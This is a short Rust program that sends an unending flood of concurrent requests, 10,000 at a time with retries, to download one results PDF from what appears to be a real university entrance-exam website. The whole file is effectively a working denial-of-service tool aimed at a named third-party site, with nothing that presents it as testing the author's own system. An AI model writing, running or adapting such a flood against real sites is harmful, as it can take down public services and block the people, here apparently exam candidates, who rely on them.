use log::{error, info};
use rand::Rng;
use reqwest::Client;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use tokio::runtime::Builder;
use tokio::sync::Semaphore;
use tokio::time::{sleep, Duration};

static URL: &str =
    "https://entrance.ioe.edu.np/notice/download?filename=BEResult2081.pdf&contentType=pdf";
const CONCURRENCY_LIMIT: usize = 10000;
const MAX_RETRIES: usize = 3;

async fn fetch_url(
    client: Arc<Client>,
    url: &str,
    reqnum: Arc<AtomicUsize>,
    errnum: Arc<AtomicUsize>,
    semaphore: Arc<Semaphore>,
) {
    let _permit = semaphore.acquire().await.unwrap();
    let mut retries = 0;

    loop {
        match client.get(url).send().await {
            Ok(_) => {
                reqnum.fetch_add(1, Ordering::SeqCst);
                info!("Request succeeded");
                break;
            }
            Err(e) => {
                retries += 1;
                if retries > MAX_RETRIES {
                    errnum.fetch_add(1, Ordering::SeqCst);
                    error!("Request failed after {} retries: {}", retries, e);
                    break;
                } else {
                    let backoff = Duration::from_millis(50);
                    let jitter = rand::thread_rng().gen_range(0..10);
                    error!(
                        "Request failed, retrying in {:?} + {}ms: {}",
                        backoff, jitter, e
                    );
                    sleep(backoff + Duration::from_millis(jitter)).await;
                }
            }
        }
    }
}

fn main() {
    env_logger::init();
    let runtime = Builder::new_multi_thread()
        .worker_threads(16) // Utilize all 16 threads
        .max_blocking_threads(16)
        .enable_all()
        .build()
        .unwrap();

    runtime.block_on(async {
        let client = Arc::new(
            Client::builder()
                .pool_max_idle_per_host(100)
                .build()
                .unwrap(),
        );
        let reqnum = Arc::new(AtomicUsize::new(0));
        let errnum = Arc::new(AtomicUsize::new(0));
        let semaphore = Arc::new(Semaphore::new(CONCURRENCY_LIMIT));

        loop {
            let mut tasks = Vec::new();
            for _ in 0..CONCURRENCY_LIMIT {
                let client = Arc::clone(&client);
                let reqnum = Arc::clone(&reqnum);
                let errnum = Arc::clone(&errnum);
                let semaphore = Arc::clone(&semaphore);
                tasks.push(tokio::spawn(async move {
                    fetch_url(client, URL, reqnum, errnum, semaphore).await;
                }));
            }

            for task in tasks {
                let _ = task.await;
            }

            println!(
                "Total requests: {}, Total errors: {}",
                reqnum.load(Ordering::SeqCst),
                errnum.load(Ordering::SeqCst)
            );
        }
    });
}
